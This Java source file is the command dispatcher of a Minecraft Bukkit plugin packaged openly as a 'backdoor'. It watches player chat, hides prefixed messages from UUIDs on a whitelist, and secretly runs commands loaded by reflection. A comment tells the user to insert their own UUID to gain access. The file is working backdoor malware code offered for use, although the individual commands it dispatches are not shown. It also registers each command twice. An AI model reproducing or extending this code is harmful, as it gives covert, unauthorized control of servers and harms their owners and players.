package me.kmatias.backdoor;

import lombok.Getter;
import lombok.SneakyThrows;
import me.kmatias.plugin.Main;
import org.bukkit.ChatColor;
import org.bukkit.event.player.PlayerChatEvent;
import org.reflections.Reflections;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class CommandMan {

    private final Main main;

    public CommandMan(Main main) {
        this.main = main;
    }

    public String EXCEPTION_CAUGHT = ChatColor.RED + "Internal exception. Was caught, no console errors.";

    // add your uuid to this list to be able to use the plugin
    List<String> whitelistedUsers = Arrays.asList("");

    @Getter
    private final List<Command> commands = new ArrayList<>();

    @SneakyThrows
    public void init() {

        Reflections reflections = new Reflections("me.kmatias.backdoor.commands");

        for (Class<? extends Command> aClass : reflections.getSubTypesOf(Command.class)) {

            try {
                AddCommand(aClass.getConstructor(Main.class).newInstance(main));
                AddCommand(aClass.getConstructor(Main.class).newInstance(main));

            } catch (Exception ignored) {
            }
        }
    }


    public void onExec(PlayerChatEvent event) {
        ArrayList<String> args = new ArrayList<>(Arrays.asList(event.getMessage().split(" ")));

        if (args.get(0).startsWith(Command.prefix) && whitelistedUsers.contains(event.getPlayer().getUniqueId().toString())) {
            event.setCancelled(true);
        } else return;
        for (Command c : commands) {

            for (String s : c.getAliases()) {
                if (args.get(0).equalsIgnoreCase(Command.prefix + s)) {
                    try {

                        StringBuilder sb = new StringBuilder(args.get(0));
                        sb.delete(0, Command.prefix.length());

                        args.add(0, sb.toString());

                        c.onExec(event, args);
                    } catch (Exception ignored) {
                        event.getPlayer().sendMessage(EXCEPTION_CAUGHT);
                    }
                    return;
                }
            }
        }
    }

    public void AddCommand(Command command) {
        commands.add(command);
    }
}
